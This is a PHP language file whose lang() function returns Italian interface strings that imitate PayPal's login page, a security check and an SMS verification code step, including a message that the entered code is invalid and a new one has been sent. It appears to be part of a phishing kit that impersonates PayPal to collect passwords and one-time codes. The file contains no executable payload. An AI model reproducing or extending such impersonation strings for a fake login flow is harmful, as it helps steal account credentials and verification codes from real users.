<?php

function lang($phrase){
    static $lang = array(
        '1' => 'Accedi al tuo account PayPal',
        '2' => 'Email o numero di telefono cellulare',
        '3' => 'Password',
        '4' => 'Password dimenticata?',
        '5' => 'Accedi',
        '6' => 'o',
        '7' => 'Registrati',
        '8' => 'Inglese',
        '9' => 'Francese',
        '10' => 'Spagnolo',
        '11' => '文',
        '12' => 'Controllo di sicurezza rapido',
        '13' => 'Abbiamo solo bisogno di alcune informazioni aggiuntive per confermare che sei tu.',
        '14' => 'Ricevi un messaggio',
        '15' => 'Continuando, confermi di essere autorizzato a utilizzare questo numero di telefono e accetti di ricevere messaggi di testo per confermare la tua identità in questa sessione. Potrebbero essere applicate tariffe dell\'operatore. Potremmo ricevere dettagli di abbonati e dispositivi dal tuo operatore wireless per scopi di rischio e frode.',
        '16' => 'Avanti',
        '17' => 'Inserisci il tuo codice',
        '18' => 'Rinvia',
        '19' => 'Continua',
        '20' => 'Contattaci',
        '21' => 'Privacy',
        '22' => 'Legale',
        '23' => 'Aggiornamenti sulla politica',
        '24' => 'In tutto il mondo',
        '25' => 'Codice non valido. Ti abbiamo inviato un nuovo codice.',
    );

    return $lang[$phrase];
}
?>
